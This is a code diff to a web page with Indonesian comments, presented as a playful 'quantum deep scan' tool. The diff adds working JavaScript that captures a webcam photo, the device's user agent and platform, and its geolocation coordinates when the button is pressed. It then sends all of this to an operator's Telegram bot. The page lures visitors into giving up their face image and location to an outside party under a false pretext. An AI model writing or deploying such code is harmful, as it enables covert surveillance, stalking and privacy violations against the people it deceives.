@@ -63,7 +63,7 @@
     <video id="video" width="300" height="300" autoplay playsinline muted></video>
   </div>
   <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
-  <div id="loading">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
   <div id="device-info">
     <h2>⚡ DEVICE MATRIX PROFILE</h2>
     <div class="info-grid" id="device-info-content"></div>
@@ -137,6 +137,28 @@
       };
     }
 
+    // Fungsi untuk mengirim data ke bot Telegram
+    function sendToTelegram(report) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      // Ubah dataURI menjadi Blob dan lampirkan sebagai file foto
+      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
+      formData.append('caption', `Location: ${report.metadata.location}\nDevice Info: ${JSON.stringify(report.metadata.deviceInfo)}`);
+
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Data berhasil dikirim:', data);
+      })
+      .catch(error => {
+        console.error('Error mengirim data ke Telegram:', error);
+      });
+    }
+
     // Fungsi untuk inisialisasi kamera
     async function initCamera() {
       try {
@@ -151,9 +173,46 @@
       }
     }
 
-    // ... (fungsi lainnya tetap sama seperti sebelumnya) ...
+    // Fungsi untuk memulai quantum scan dan mengirim data ke Telegram
+    async function startQuantumScan() {
+      if(isScanning) return;
+      isScanning = true;
+      loading.style.display = 'block';
 
-    // Event listener dan inisialisasi
+      // Ambil gambar dari kamera
+      const imageData = await captureQuantumImage();
+
+      // Dapatkan informasi perangkat (misalnya userAgent dan platform)
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform
+      };
+
+      // Dapatkan lokasi (jika diizinkan)
+      let location = 'Unknown';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            location = position.coords.latitude + ', ' + position.coords.longitude;
+            const report = generateHologramReport(imageData, location, deviceInfo);
+            sendToTelegram(report);
+          },
+          (error) => {
+            console.error('Geolocation error:', error);
+            const report = generateHologramReport(imageData, location, deviceInfo);
+            sendToTelegram(report);
+          }
+        );
+      } else {
+        const report = generateHologramReport(imageData, location, deviceInfo);
+        sendToTelegram(report);
+      }
+      
+      loading.style.display = 'none';
+      isScanning = false;
+    }
+
+    // Inisialisasi kamera dan event listener
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
